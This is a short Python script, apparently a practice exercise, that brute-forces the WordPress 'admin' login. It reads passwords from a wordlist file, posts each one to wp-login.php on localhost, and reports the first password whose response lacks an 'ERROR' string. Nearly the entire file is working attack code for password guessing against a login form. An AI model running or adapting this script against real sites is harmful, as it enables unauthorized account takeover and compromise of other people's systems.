# -*- coding: utf-8 -*-
"""
Created on Tue Mar 22 15:14:57 2022

@author: User
"""

#You have a text file that contains passwords and you want to bruteforce 
# the login for "admin user"

import requests

pass_dictionary = "passwords.txt"

#stripping new lines 

passwords = [line.rstrip('\n') for line in open(pass_dictionary)]

for password in passwords:
    print("Trying passwords: " , password)
    resp = requests.post('http://localhost/wp-login.php', data = {'log':'admin', 'pwd': password })
    if "ERROR" not in resp.text:
        print("Login successful with password: ",password)
        break

print(resp.text)